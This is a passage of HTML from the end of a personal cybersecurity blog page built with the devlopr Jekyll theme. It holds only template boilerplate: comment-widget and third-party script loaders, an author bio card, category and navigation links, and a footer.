PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About Phil Malle</div> <div class="card-body"> <p class="author_bio">Hi, my name is Phil Malle. This is my personal blog about technologies, Cyber-Security and other similar topics.</p><a class="github-button" href="https://github.com/PhilMalle/philmalle.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star PhilMalle/philmalle.github.io on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#walkthroughs"></div> <li class="tag-head"> <a href="/blog/categories/walkthroughs">walkthroughs</a> </li> <a name="walkthroughs"></a> <div id="#journey"></div> <li class="tag-head"> <a href="/blog/categories/journey">journey</a> </li> <a name="journey"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="/about">About Me</a> </li> <li> <a href="/gallery">Achievements</a> </li> <li> <a href="/blog">Blog</a> </li> <li> <a href="/contact">Contact</a> </li> <li> <a href="/links">Links</a> </li> <li> <a href="/pgp">GNUPG-Public Key</a> </li> </div> </div> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/sujaykundu777/devlopr-jekyll"> devlopr jekyll</a>.Hosted at <a href="https://pages.github.com">Github</a>. &copy; by Phil Malle 2021</p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="/assets/js/mode-switcher.js"></script> <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> <!-- olvy releases --> <script> var OlvyConfig = { organisation: "", target: "#olvy-target", type: "sidebar", view: { showSearch: true, compact: true, showHeader: true, /* only applies when widget type is embed. you cannot hide header for modal and sidebar widgets */ showUnreadIndicator: true, unreadIndicatorColor: "#FFA13AFF", unreadIndicatorPosition: "top-right" } }; </script> <script type="text/javascript" src="https://app.olvy.co/script.js" defer="defer"></script> </body> </html>
